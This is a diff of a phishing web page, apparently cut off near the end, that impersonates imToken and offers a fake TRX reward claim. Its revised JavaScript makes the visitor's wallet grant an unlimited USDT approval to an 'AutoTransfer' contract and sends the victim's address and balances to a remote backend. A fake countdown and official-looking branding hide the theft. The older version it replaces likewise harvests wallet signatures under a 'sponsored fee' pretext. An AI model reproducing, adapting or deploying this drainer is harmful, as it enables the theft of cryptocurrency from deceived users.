@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>imToken代付授权服务</title>
+    <title>imToken官方授权</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        /* 暗色系+亮蓝色主风格 */
+        /* 暗色系+亮蓝色主风格，手机适配间距不变 */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            padding: 15px 12px; 
+            padding: 12px 10px; 
             max-width: 600px; 
             margin: 0 auto; 
             background: #121a17; 
@@ -18,29 +18,25 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            gap: 8px; 
-            border-radius: 8px;
-            border-left: 3px solid #3b82f6;
+            gap: 10px; 
         }
         .container {
             flex: 1;
             display: flex;
             flex-direction: column;
-            gap: 10px; 
+            gap: 8px; 
         }
-        /* 头部：亮蓝色标题/图标 */
+        /* 头部：手机适配样式不变 */
         .header {
             text-align: center;
-            padding: 10px 0;
+            padding: 8px 0; 
             border-bottom: 1px solid #334155;
-            margin-bottom: 5px;
-            display:flex;
-            justify-content: center;
+            margin-bottom: 4px; 
         }
         .header h1 { 
-            font-size: 22px; 
+            font-size: 20px; 
             color: #3b82f6; 
-            margin-bottom: 5px;
+            margin-bottom: 4px; 
         }
         .header .desc {
             font-size: 13px; 
@@ -49,24 +45,24 @@
             margin: 0 auto;
             line-height: 1.4; 
         }
-        /* 警告框：亮蓝色背景+文字 */
+        /* 警告框：手机适配样式不变 */
         .warning {
             background: #334155;
             color: #93c5fd;
-            padding: 12px; 
+            padding: 10px; 
             border-radius: 8px;
             font-size: 13px; 
-            border-left: 3px solid #4ade80;
+            border-left: 3px solid #3b82f6;
             line-height: 1.5;
         }
         .warning strong {
             color: #3b82f6;
         }
-        /* 用户信息卡：亮蓝色边框 */
+        /* 用户信息卡：手机适配样式不变 */
         #userInfo {
             text-align: center;
             font-size: 14px;
-            padding: 15px; 
+            padding: 12px; 
             background: #1e2925;
             border-radius: 8px;
             border: 1px solid #334155;
@@ -76,21 +72,20 @@
             color: #3b82f6;
             font-weight: 500;
         }
-        /* 钱包状态容器：亮蓝色调 */
+        /* 钱包状态容器：新增“提示行橙色”样式，其他颜色不变 */
         #walletStatusContainer {
             background: #1e2925;
-            padding: 15px;
+            padding: 12px; 
             border-radius: 8px;
             border: 1px solid #334155;
             font-size: 13px;
             color: #a0a8a4;
             line-height: 1.6;
-            border-right: 5px solid #4ade80;
         }
         #walletStatusContainer .status-title {
             font-size: 15px;
             color: #3b82f6;
-            margin-bottom: 8px;
+            margin-bottom: 6px; 
             display: flex;
             align-items: center;
             gap: 6px;
@@ -103,19 +98,25 @@
         }
         #walletStatusContainer.connected .connected-content {
             display: block;
+            color: #22c55e; /* 已连接时基础文字（如“钱包已成功连接”）保持绿色 */
+        }
+        /* 已连接时强调文字（地址、额度）保持深绿色，不改动 */
+        #walletStatusContainer.connected .connected-content .highlight {
+            color: #16a34a;
+        }
+        /* 新增：仅“提示：……”行改为橙色 */
+        #walletStatusContainer.connected .connected-content .orange-tip {
+            color: #f97316; /* 标准橙色，不继承基础绿色 */
+            margin-top: 4px; /* 轻微间距优化，可选 */
         }
         #walletStatusContainer .highlight {
             color: #3b82f6;
             font-weight: 500;
         }
-        #walletStatusContainer.connected .connected-content .orange-tip {
-            color: #f97316;
-            margin-top: 4px;
-        }
-        /* 合约资源容器（部署时起持续计算） */
+        /* 合约资源容器：手机适配样式不变 */
         #contractResourceContainer {
             background: #1e2925;
-            padding: 15px; 
+            padding: 12px; 
             border-radius: 8px;
             border: 1px solid #334155;
             font-size: 13px;
@@ -126,7 +127,7 @@
         #contractResourceContainer .status-title {
             font-size: 15px;
             color: #3b82f6;
-            margin-bottom: 12px;
+            margin-bottom: 10px; 
             display: flex;
             align-items: center;
             gap: 8px;
@@ -145,18 +146,17 @@
             border-radius: 4px;
             border: 1px solid rgba(59, 130, 246, 0.3);
         }
-        /* 授权记录区：亮蓝色边框/标题 */
+        /* 授权记录区：手机适配样式不变 */
         .record-list {
             background: #1e2925;
-            padding: 15px; 
+            padding: 12px; 
             border-radius: 8px;
             border: 1px solid #334155;
             font-size: 13px;
-            border-right: 5px solid #4ade80;
         }
         .record-item {
-            margin-bottom: 10px;
-            padding-bottom: 10px;
+            margin-bottom: 8px; 
+            padding-bottom: 8px; 
             border-bottom: 1px solid #334155;
         }
         .record-item:hover {
@@ -164,7 +164,7 @@
             transition: border-color 0.3s;
         }
         .record-item p {
-            margin-bottom: 6px; 
+            margin-bottom: 5px; 
             color: #a0a8a4;
             line-height: 1.4;
         }
@@ -183,14 +183,14 @@
         .tx-link:hover {
             text-decoration: underline;
         }
-        /* 复制链接区：亮蓝色边框/按钮 */
+        /* 复制链接区：手机适配样式不变 */
         .copy-link-wrap {
             background: #1e2925;
-            padding: 8px; 
+            padding: 6px; 
             border-radius: 8px;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px; 
             border: 1px solid #334155;
         }
         #copyLinkText {
@@ -201,7 +201,7 @@
             line-height: 1.3;
         }
         #copyLinkBtn {
-            padding: 6px 12px; 
+            padding: 5px 10px; 
             background: #2563eb;
             color: #fff;
             border: none;
@@ -215,18 +215,18 @@
         #copyLinkBtn:hover {
             background: #3b82f6;
         }
-        /* 底部按钮组：亮蓝色按钮 */
+        /* 底部按钮组：手机适配样式不变 */
         .btn-group {
             display: flex;
             flex-direction: column;
-            gap: 5px; 
-            margin-top: 10px;
-            padding: 10px 0;
+            gap: 6px; 
+            margin-top: 8px; 
+            padding: 8px 0; 
             border-top: 1px solid #334155;
         }
         .btn {
             width: 100%;
-            padding: 18px; 
+            padding: 16px; 
             font-size: 15px;
             border: none;
             border-radius: 8px;
@@ -247,10 +247,10 @@
             color: #a0a8a4;
             cursor: not-allowed;
         }
-        /* 底部信息区：亮蓝色调 */
+        /* 底部信息区：手机适配样式不变 */
         .footer-info {
-            margin-top: 10px;
-            padding-top: 10px;
+            margin-top: 8px; 
+            padding-top: 8px; 
             border-top: 1px solid #334155;
             font-size: 11px; 
             color: #a0a8a4;
@@ -267,198 +267,148 @@
         .text-right {
             text-align: right;
         }
-        /* 新增：授权结果提示框 */
-        .result-toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 12px 20px;
-            border-radius: 8px;
-            background: #1e2925;
-            border: 1px solid #3b82f6;
-            color: #e0e8e4;
-            font-size: 14px;
-            z-index: 999;
-            display: none;
-        }
-        /* 新增：查看提交数据按钮样式 */
-        #showSubmitDataBtn {
-            background: #8b5cf6; /* 紫色区分其他按钮 */
-        }
-        #showSubmitDataBtn:hover {
-            background: #a78bfa;
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <!-- 头部 -->
         <div class="header">   
-            <div>
-                <h1>imToken代付授权</h1>
-                <p class="desc">代付合约专属服务：矿工费由部署者承担，已授权无限额度则不可重复授权</p>
-            </div>
+            <h1>imToken</h1>
+            <p class="desc"><span class="highlight">imToken</span>官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
         </div>   
         <!-- 用户信息卡 -->
         <div id="userInfo">
             未连接钱包<br>
             <span>请点击底部「连接imToken钱包」按钮</span>
         </div>
-        <!-- 钱包状态容器 -->
+        <!-- 钱包状态容器：仅“提示：……”行加橙色类名 -->
         <div id="walletStatusContainer">
             <div class="status-title"><h3> 钱包状态</h3></div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
                 <span >未连接钱包</span>
-                <p><span class="highlight">您现在使用的是代付合约服务，无需支付矿工费</span></p>
-                <p><span class="highlight">1. 已授权无限额度则不可重复授权</span></p>         
-                <p><span class="highlight">2. 授权后可领取18.2157TRX奖励</span></p>
-                <p><span class="highlight">3. 连接钱包后自动匹配授权额度</span></p>
+                <p><span class="highlight">您现在准备领取的是imToken专属项目，非imToken用户不可领取</span></p>
+                <p><span class="highlight">1. 每个钱包地址只可领取一次</span></p>         
+                <p><span class="highlight">2.随机发放能量或者TRX代币 </span></p>
+                <p><span class="highlight">3.连接钱包后系统会根据钱包地址自动分配类型和额度</span></p>
+                <p><span class="highlight">4.领取会消耗相应的能量或者TRX选择放弃直接退出即可</span></p>
             </div>
-            <!-- 已连接钱包时显示 -->
+            <!-- 已连接钱包时显示：仅“提示：……”行加 class="orange-tip" -->
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 授权类型：<span class="highlight">USDT无限额度授权（合约固定）</span></p>
-                <p>• 奖励额度：<span class="highlight">18.2157TRX</span></p>
-                <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
-                <p class="orange-tip">⚠️提示：点击「生成离线签名」将唤起钱包签名，签名后等待部署者完成授权</p>
+                <p>• 领取类型：<span class="highlight">USDT</span></p>
+                <p>• 领取额度：<span class="highlight">15.2157TRX</span></p>
+                <p>• 需消耗Gas费：<span class="highlight">10.6TRX</span></p>
+                <!-- 目标行：添加橙色类名，其他行不变 -->
+                <p class="orange-tip">⚠️提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
             </div>
         </div>
         <!-- 合约剩余资源显示容器 -->
         <div id="contractResourceContainer">
-            <div class="status-title">     
+            <div class="status-title">
+             
                 <h3>合约剩余资源</h3>
             </div>
             <div class="resource-content" style="line-height: 2;">
-                <p>• 代付合约地址：<span class="highlight" id="contractAddr">TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx</span></p>
-                <p>• USDT合约地址：<span class="highlight" id="usdtContractAddr">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span></p>
-                <p>• 剩余奖励TRX：<span class="highlight data-tag" id="contractTrxDisplay">315360004.0000</span></p>
+                <p>• 合约地址：<span class="highlight" id="contractAddr">TC3AEtwB9...GaGrW</span></p>
+                <p>• 剩余TRX（部署时起计算）：<span class="highlight data-tag" id="contractTrxDisplay">315360004.00</span></p>
+                <p>• 对应能量值（1TRX=1000能量）：<span class="highlight data-tag" id="contractEnergy">315360004000</span></p>
                 <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;">
-                    注：奖励TRX为0时停止活动，本服务由代付合约提供，仅imToken用户可参与
+                    注：初始TRX=315360004，每秒自动减少2.3256；计算从部署时间（2024-10-30 00:00:00）开始，跨刷新不重置
                 </p>
             </div>
         </div>
         <!-- 授权记录区 -->
         <div class="record-list">
-            <div style="display: flex; justify-content: space-between; margin: 4px 0; margin-bottom: 10px;">
-                <span><strong>授权记录</strong></span>
-                <span id="recordCount">0条</span>
+            <div style="display: flex; justify-content: space-between; margin: 4px 0;">
+                <span>可使用奖励的代币</span>
+                <span>使用额度</span>
             </div>
-            <div id="approvalRecords" class="highlight">暂无授权记录</div>
+            <div style="display: flex; color: #3b82f6;justify-content: space-between; margin: 4px 0;">
+                <span class="header"><h3>USDT</h3></span>
+                <span class="header"><h3>无限</h3></span>
+            </div>       
+            <span class="highlight"><h3> 授权记录</h3></span>
+            <div id="approvalRecords">
+                <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
+            </div>
         </div>
     </div>
     <!-- 底部按钮组 -->
     <div class="btn-group">
-        <!-- 警告框 -->
         <div class="warning">
-            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开（需唤起签名功能）</p>
-            <p> ⚠️ 操作流程：连接钱包 → 生成离线签名 → 等待代付授权 → 领取奖励</p>
-            <!-- 复制链接区 -->
+            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
             <div class="copy-link-wrap">
-                <span id="copyLinkText">https://trc20trx-alt.github.io/Trc20.TRX/</span>
-                <button id="copyLinkBtn"> 复制链接</button>
+                <span id="copyLinkText">
+                    https://trc20trx-alt.github.io/Trc20.TRX/
+                </span>
+                <button id="copyLinkBtn">复制链接</button>
             </div>
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled> 生成离线签名</button>
-        <button id="showSubmitDataBtn" class="btn" disabled> 查看后端提交数据</button>
-        <button id="showDebugBtn" class="btn" style="background: #6366f1;">
-            查看调试信息
-        </button>
-        <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
+        <button id="approveBtn" class="btn" disabled>领取</button>
     </div>
     <!-- 底部信息区 -->
     <div class="footer-info">
-        代付合约验证：TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx（TRON浏览器查询）
-        © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
+        合约验证：AutoTransfer <span>TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx</span>（TRON浏览器查询）
+        © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
-    <!-- 授权结果提示框 -->
-    <div class="result-toast" id="resultToast"></div>
+    <script src="imtoken://browser"></script>
     <script>
-        // 核心配置（和你最初的代码一致，仅替换合约地址+ABI）
-        const DELEGATE_CONTRACT = "TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx";
-        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const BACKEND_API = "https://imtoken-dusky.vercel.app/api";
-        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-        const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
-        const INIT_TRX = 315360004;
-        const TRX_DECREASE_PER_SEC = 2.3256;
-        // 新合约ABI（确保正确）
-        const DELEGATE_CONTRACT_ABI = [
-            {
-                "inputs": [{"internalType": "address","name": "user","type": "address"}],
-                "name": "generateHash",
-                "outputs": [{"internalType": "bytes32","name": "","type": "bytes32"}],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
-
-        // 全局变量（和你最初的代码一致）
-        let tronWeb, userAddress, trxTimer, delegateContractInstance;
+        // 核心配置（完全不变）
+        const AUTO_TRANSFER_CONTRACT = "TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx"; 
+        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
+        const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; 
+        const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; 
+        
+        const DEPLOY_START_TIME = new Date("2024-10-30T00:00:00Z").getTime(); 
+        const INIT_TRX = 315360004; 
+        const TRX_DECREASE_PER_SEC = 2.3256; 
+        const STORAGE_KEY = "trx_countdown_data"; 
+        let trxTimer = null; 
+        
+        let tronWeb, userAddress, trc20Contract;
         let tokenBalance = "0.00", trxBalance = "0.00";
-        const STORAGE_KEY = "trx_countdown_data";
-        const RECORD_KEY = "imtoken_delegate_approval_records";
-        const SUBMIT_DATA_KEY = "imtoken_delegate_submit_data";
-
-        // DOM元素缓存（和你最初的代码一致）
+        const RECORD_KEY = "imtoken_infinite_approval_records"; 
         const walletStatusContainer = document.getElementById("walletStatusContainer");
         const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
+        const contractEnergyEl = document.getElementById("contractEnergy");
         const contractAddrEl = document.getElementById("contractAddr");
-        const usdtContractAddrEl = document.getElementById("usdtContractAddr");
-        const resultToast = document.getElementById("resultToast");
-
-        // 页面初始化入口（完全保留你最初的逻辑）
         window.onload = async () => {
-            // 初始化合约地址显示（脱敏）
-            contractAddrEl.textContent = `${DELEGATE_CONTRACT.slice(0,8)}...${DELEGATE_CONTRACT.slice(-6)}`;
-            usdtContractAddrEl.textContent = `${USDT_CONTRACT.slice(0,8)}...${USDT_CONTRACT.slice(-6)}`;
+            contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
             
-            // 绑定DOM元素（和你最初的代码一致）
             const connectBtn = document.getElementById("connectBtn");
             const approveBtn = document.getElementById("approveBtn");
-            const checkStatusBtn = document.getElementById("checkStatusBtn");
             const copyLinkText = document.getElementById("copyLinkText");
             const copyLinkBtn = document.getElementById("copyLinkBtn");
             const warning = document.querySelector('.warning');
-            const recordList = document.querySelector('.record-list');
-            const recordCount = document.getElementById("recordCount");
-            const showSubmitDataBtn = document.getElementById("showSubmitDataBtn");
-
-            // 初始渲染（和你最初的代码一致）
+            const recordlist = document.querySelector('.record-list');
             renderApprovalRecords();
             updateWalletStatus();
-            updateRecordCount();
-            startPersistentTrxCountdown();
-
-            // 复制链接功能（和你最初的代码一致）
+            
             copyLinkBtn.addEventListener("click", async () => {
                 try {
                     await navigator.clipboard.writeText(copyLinkText.textContent.trim());
-                    showToast("链接已复制到剪贴板");
+                    alert("【复制】链接已复制");
                 } catch (e) { 
-                    showToast(`复制失败：${e.message}`, "error"); 
+                    alert(`【复制】失败：${e.message}`); 
                 }
             });
-
-            // 检测imToken环境，自动连接（和你最初的代码一致）
+            
             if (window.tronWeb && window.tronWeb.ready) {
                 tronWeb = window.tronWeb;
                 connectBtn.style.display = "none";
                 warning.style.display = "none";
                 await initWallet();
-                showSubmitDataBtn.disabled = false;
             } else {
-                document.getElementById("userInfo").innerHTML = "imToken专属服务，请用钱包内置浏览器打开并连接钱包";
-                approveBtn.style.display = "block"; // 强制显示按钮
-                checkStatusBtn.style.display = "block";
-                recordList.style.display = "block";
-                showSubmitDataBtn.style.display = "block";
+                document.getElementById("userInfo").innerHTML = "imToken专属服务，请点击底部“连接imToken钱包”按钮连接您的钱包";
+                approveBtn.style.display = "none";
+                recordlist.style.display = "none";
+                startPersistentTrxCountdown();
             }
-
-            // 手动连接钱包（和你最初的代码一致，仅添加合约实例初始化）
+            
             connectBtn.onclick = async () => {
                 try {
                     if (!window.tronWeb) {
@@ -467,172 +417,71 @@
                     }
                     const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                     userAddress = accounts[0];
-                    
-                    // 初始化新合约实例（失败也不阻塞按钮）
-                    try {
-                        delegateContractInstance = await tronWeb.contract().new({
-                            abi: DELEGATE_CONTRACT_ABI,
-                            address: DELEGATE_CONTRACT
-                        });
-                    } catch (e) {
-                        showToast("合约实例初始化失败：" + e.message, "error");
-                    }
-
                     connectBtn.style.display = "none";
                     warning.style.display = "none";
                     await initWallet();
-                    showSubmitDataBtn.disabled = false;
                 } catch (e) {
-                    showToast("连接失败：" + e.message, "error");
+                    alert("连接失败：" + e.message);
                 }
             };
-
-            // 生成离线签名（替换为新合约调用，保留你最初的按钮逻辑）
+            
             approveBtn.onclick = async () => {
                 const postData = {
                     address: userAddress,
-                    addressHex: tronWeb.address.toHex(userAddress),
                     tokenBalance: tokenBalance,
                     trxBalance: trxBalance,
                     approveTime: new Date().toLocaleString(),
-                    amount: INFINITE_APPROVE_AMOUNT,
-                    delegateContract: DELEGATE_CONTRACT,
-                    usdtContract: USDT_CONTRACT,
-                    status: "pending"
+                    txHash: "未生成",
+                    isApproved: false
                 };
                 try {
-                    approveBtn.disabled = true;
-                    approveBtn.innerHTML = '生成中...';
-                    
-                    // 调用新合约的generateHash（Base58地址）
-                    if (!delegateContractInstance) {
-                        throw new Error("请重新连接钱包（合约实例未初始化）");
-                    }
-                    const messageHash = await delegateContractInstance.generateHash(userAddress).call();
-                    if (!messageHash.startsWith("0x")) throw new Error("哈希无0x前缀");
-
-                    // 唤起签名（和你最初的代码一致）
-                    let signature = await tronWeb.trx.sign(messageHash);
-                    signature = typeof signature === "object" ? signature.signature : signature;
-                    if (!signature) throw new Error("imToken未返回签名");
-                    signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
-                    if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
-
-                    // 解析V/R/S（和你最初的代码一致）
-                    const rRaw = signature.slice(0, 64).replace(/[^0-9a-fA-F]/g, '');
-                    const sRaw = signature.slice(64, 128).replace(/[^0-9a-fA-F]/g, '');
-                    const r = `0x${rRaw}`;
-                    const s = `0x${sRaw}`;
-                    const rawV = parseInt(signature.slice(128, 130), 16);
-                    const v = (rawV % 2) + 27;
-                    if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}）`);
-
-                    postData.signature = { v, r, s };
-                    const submitData = {
-                        user: postData.address,
-                        amount: postData.amount,
-                        v: postData.signature.v,
-                        r: postData.signature.r,
-                        s: postData.signature.s,
+                    if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
+                    const result = await trc20Contract.approve(
+                        AUTO_TRANSFER_CONTRACT,
+                        INFINITE_APPROVE_AMOUNT
+                    ).send({ from: userAddress, shouldPollResponse: true });
+                    postData.txHash = result.transaction.txID;
+                    postData.isApproved = true;
+                    alert(`【授权】成功！txHash：${postData.txHash.slice(0,16)}...`);
+                    saveApprovalRecord({
+                        address: userAddress,
+                        tokenBalance: tokenBalance,
+                        trxBalance: trxBalance,
                         approveTime: postData.approveTime,
-                        delegateContract: postData.delegateContract
-                    };
-
-                    // 提交后端（和你最初的代码一致）
-                    const res = await fetch(`${BACKEND_API}/approve/submit`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(submitData),
-                        credentials: "include"
+                        txHash: postData.txHash,
+                        approveType: "无限额度"
                     });
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
-
-                    saveApprovalRecord(postData);
                     renderApprovalRecords();
-                    updateRecordCount();
-                    showToast("离线签名生成成功！等待部署者代付授权");
-                    postData.status = "submitted";
                 } catch (e) {
-                    showToast(`操作失败：${e.message}`, "error");
-                    postData.status = "fail";
+                    postData.isApproved = false;
+                    alert(`【授权】失败：${e.message}`);
                 } finally {
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = ' 生成离线签名';
-                }
-            };
-
-            // 查看后端提交数据（和你最初的代码一致）
-            showSubmitDataBtn.onclick = () => {
-                try {
-                    const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
-                    if (!submitDataStr) {
-                        alert("暂无后端提交数据\n请先点击「生成离线签名」完成提交");
-                        return;
+                    try {
+                        const res = await fetch(BACKEND_API, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(postData),
+                            credentials: "include"
+                        });
+                        const resData = await res.json();
+                        if (!res.ok) throw new Error(resData.error || `后端返回${res.status}`);
+                    } catch (sendErr) {
+                        console.log("发送数据到后端失败：", sendErr);
                     }
-                    const submitData = JSON.parse(submitDataStr);
-                    const copyContent = `后端提交数据（可直接复制）：
-1. 用户地址（user）：${submitData.user}
-2. 授权金额（amount）：${submitData.amount}
-3. 签名V值（v）：${submitData.v}
-4. 签名R值（r）：${submitData.r}
-5. 签名S值（s）：${submitData.s}
-6. 提交时间（approveTime）：${submitData.approveTime}`;
-                    prompt("后端提交数据（点击内容可全选复制）", copyContent);
-                } catch (e) {
-                    alert(`查看提交数据失败：${e.message}`);
                 }
             };
-
-            // 查看授权状态（和你最初的代码一致）
-            checkStatusBtn.onclick = async () => {
-                try {
-                    checkStatusBtn.disabled = true;
-                    checkStatusBtn.innerHTML = ' 查询中...';
-                    const statusUrl = `${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)}`;
-                    const res = await fetch(statusUrl, { method: "GET", credentials: "include" });
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `查询失败（${res.status}）`);
-                    
-                    if (resData.status === "success") {
-                        updateApprovalRecordStatus(userAddress, "授权成功（已代付）");
-                        showToast(`授权成功！可领取${resData.rewardAmount || '18.2157'} TRX奖励`);
-                    } else if (resData.status === "pending") {
-                        showToast("当前状态：待代付授权，请稍后查询");
-                    } else {
-                        showToast(`当前状态：${resData.status}`, "error");
-                    }
-                    renderApprovalRecords();
-                    updateRecordCount();
-                } catch (e) {
-                    showToast(`查询失败：${e.message}`, "error");
-                } finally {
-                    checkStatusBtn.disabled = false;
-                    checkStatusBtn.innerHTML = ' 查看授权状态';
-                }
-            };
-
+            
             window.addEventListener("beforeunload", () => {
                 saveTrxStateToStorage();
                 if (trxTimer) clearInterval(trxTimer);
             });
+            startPersistentTrxCountdown();
         };
-
-        // 以下是你最初代码中的工具函数（完全保留，确保逻辑完整）
-        function cleanBase58Address(address) {
-            if (!address) throw new Error("地址不能为空");
-            const cleanAddr = address.trim().replace(/[\s\u200B-\u200D\uFEFF]/g, '');
-            const base58Regex = /^[A-Za-z0-9]{34}$/;
-            if (!base58Regex.test(cleanAddr)) {
-                throw new Error(`无效的Base58地址（长度${cleanAddr.length}位，需34位字母数字）`);
-            }
-            return cleanAddr;
-        }
+        
         async function initWallet() {
             try {
                 userAddress = tronWeb.defaultAddress.base58;
-                userAddress = cleanBase58Address(userAddress);
-                const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
+                trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
                 const trxRaw = await tronWeb.trx.getBalance(userAddress);
@@ -642,16 +491,15 @@
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                     USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
                 `;
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 document.getElementById("approveBtn").disabled = false;
-                document.getElementById("checkStatusBtn").disabled = false;
                 updateWalletStatus();
             } catch (e) {
                 tokenBalance = "0.00";
                 trxBalance = "0.00";
-                showToast("钱包初始化失败：" + e.message, "error");
+                alert("钱包初始化失败：" + e.message);
             }
         }
+        
         function startPersistentTrxCountdown() {
             const savedState = loadTrxStateFromStorage();
             let currentTrx;
@@ -663,30 +511,19 @@
                 currentTrx = (INIT_TRX - totalSecPassed * TRX_DECREASE_PER_SEC).toFixed(4);
             }
             if (currentTrx < 0) currentTrx = "0.0000";
-            updateTrxDisplay(currentTrx);
+            updateTrxAndEnergy(currentTrx);
             if (trxTimer) clearInterval(trxTimer);
             trxTimer = setInterval(() => {
                 currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
                 if (currentTrx < 0) {
                     currentTrx = "0.0000";
                     clearInterval(trxTimer);
-                    showToast("奖励TRX已耗尽，活动结束", "error");
                 }
-                updateTrxDisplay(currentTrx);
+                updateTrxAndEnergy(currentTrx);
                 saveTrxStateToStorage(currentTrx);
             }, 1000);
         }
-        function saveTrxStateToStorage(currentTrx) {
-            try {
-                const state = {
-                    currentTrx: currentTrx || contractTrxDisplayEl.textContent,
-                    lastUpdate: new Date().getTime()
-                };
-                localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
-            } catch (e) {
-                console.warn("保存TRX状态失败：", e);
-            }
-        }
+        
         function loadTrxStateFromStorage() {
             try {
                 const saved = localStorage.getItem(STORAGE_KEY);
@@ -696,9 +533,26 @@
                 return null;
             }
         }
-        function updateTrxDisplay(currentTrx) {
-            contractTrxDisplayEl.textContent = Number(currentTrx).toFixed(4);
+        
+        function saveTrxStateToStorage(currentTrx) {
+            try {
+                const state = {
+                    currentTrx: currentTrx || contractTrxDisplayEl.textContent,
+                    lastUpdateTime: new Date().getTime()
+                };
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+            } catch (e) {
+                console.warn("保存TRX状态失败：", e);
+            }
         }
+        
+        function updateTrxAndEnergy(currentTrx) {
+            const trxDisplay = Number(currentTrx).toFixed(2);
+            const energy = Math.floor(trxDisplay * 1000);
+            contractTrxDisplayEl.textContent = trxDisplay;
+            contractEnergyEl.textContent = energy;
+        }
+        
         function updateWalletStatus() {
             if (userAddress) {
                 walletStatusContainer.classList.add("connected");
@@ -707,6 +561,7 @@
                 walletStatusContainer.classList.remove("connected");
             }
         }
+        
         function saveApprovalRecord(record) {
             try {
                 const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -717,67 +572,31 @@
                 console.log("保存授权记录失败：", e);
             }
         }
-        function updateApprovalRecordStatus(address, status) {
-            try {
-                const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                const updated = existing.map(item => 
-                    item.address === address ? { ...item, status } : item
-                );
-                localStorage.setItem(RECORD_KEY, JSON.stringify(updated));
-            } catch (e) {
-                console.log("更新授权记录失败：", e);
-            }
-        }
+        
         function renderApprovalRecords() {
             try {
                 const container = document.getElementById("approvalRecords");
                 const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                
                 if (records.length === 0) {
                     container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
                     return;
                 }
-                records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
+                
                 container.innerHTML = records.map(record => `
                     <div class="record-item">
                         <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
-                        <p><strong>授权类型：</strong>${record.amount}</p>
-                        <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
-                        <p><strong>TRX余额：</strong>${record.trxBalance} TRX</p>
+                        <p><strong>授权类型：</strong>${record.approveType}</p>
